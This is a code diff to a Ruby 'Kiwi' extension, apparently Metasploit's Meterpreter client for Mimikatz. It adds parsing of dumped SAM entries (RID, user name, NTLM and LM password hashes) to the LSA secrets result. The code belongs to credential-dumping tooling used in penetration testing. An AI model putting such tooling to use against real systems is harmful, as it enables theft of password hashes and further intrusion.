@@ -55,7 +55,8 @@ class Kiwi < Extension
       :syskey   => to_hex_string(response.get_tlv_value(TLV_TYPE_KIWI_LSA_SYSKEY)),
       :nt5key  => to_hex_string(response.get_tlv_value(TLV_TYPE_KIWI_LSA_NT5KEY)),
       :nt6keys  => [],
-      :secrets => []
+      :secrets => [],
+      :samkeys => []
     }
 
     response.each(TLV_TYPE_KIWI_LSA_NT6KEY) do |k|
@@ -78,6 +79,15 @@ class Kiwi < Extension
       r[:old] ||= to_hex_dump(s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_OLD_RAW))
 
       result[:secrets] << r
+    end
+
+    response.each(TLV_TYPE_KIWI_LSA_SAM) do |s|
+      result[:samkeys] << {
+        :rid       => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_RID),
+        :user      => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_USER),
+        :ntlm_hash => to_hex_string(s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_NTLMHASH)),
+        :lm_hash   => to_hex_string(s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_LMHASH))
+      }
     end
 
     return result
